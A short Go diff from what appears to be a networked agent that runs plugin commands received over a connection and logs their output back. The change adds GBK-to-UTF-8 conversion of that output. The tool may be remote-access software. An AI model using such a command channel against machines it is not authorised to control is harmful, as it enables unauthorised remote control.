@@ -498,7 +498,15 @@ func Read(Data []byte, Connection net.Conn) {
 			go func() {
 				stdIO := pluginCmd(*unmsgpack)
 				//fmt.Println(stdIO)
-				SessionLog(stdIO, Connection, *unmsgpack)
+
+				result := ""
+				result = string(stdIO)
+				utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
+				if err != nil {
+					//Log(err.Error(), Connection, *unmsgpack)
+					utf8Stdout = err.Error()
+				}
+				SessionLog(utf8Stdout, Connection, *unmsgpack)
 			}()
 		}
 
